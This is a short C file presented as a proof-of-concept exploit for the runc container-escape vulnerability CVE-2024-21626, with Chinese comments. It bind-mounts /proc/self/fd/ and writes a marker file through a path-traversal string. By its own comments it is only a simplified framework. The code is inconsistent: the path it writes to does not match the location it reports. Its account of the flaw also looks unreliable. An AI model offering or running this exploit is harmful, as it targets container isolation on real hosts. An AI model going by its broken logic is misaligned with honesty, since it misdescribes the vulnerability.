// cve-2024-21626-poc/exploit.c
#define _GNU_SOURCE
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef CLONE_NEWNS
#define CLONE_NEWNS 0x00020000
#endif

int main(int argc, char *argv[]) {
    // 创建挂载点
    mkdir("/tmp/poc", 0755);

    // 尝试绑定挂载宿主机 /proc/self/fd/ 到容器内目录
    // 利用 runc 在 exit 时未正确关闭 fd 的缺陷
    if (mount("/proc/self/fd/", "/tmp/poc", NULL, MS_BIND, NULL) != 0) {
        perror("[-] mount /proc/self/fd/");
        return 1;
    }

    // 关键：触发 runc 在 cleanup 阶段使用已泄露的 fd
    // 实际逃逸需更复杂操作，此处简化为写入宿主机文件（仅在特定条件下有效）
    // 更完整的 PoC 需要劫持 runc 的内部 fd 并写入宿主机路径

    // 为演示目的，我们尝试写入一个“可能”映射到宿主机的路径
    // 注意：真实逃逸需利用 /proc/[runc-pid]/fd/...，此处仅为框架
    FILE *fp = fopen("/tmp/poc/../../../pwned_by_cve_2024_21626", "w");
    if (fp) {
        fprintf(fp, "Escaped via CVE-2024-21626!\n");
        fclose(fp);
        printf("[+] Maybe wrote to host? Check /tmp/pwned_by_cve_2024_21626\n");
    } else {
        printf("[-] Failed to write (expected in non-vulnerable env)\n");
    }

    // 快速退出，触发 runc cleanup
    return 0;
}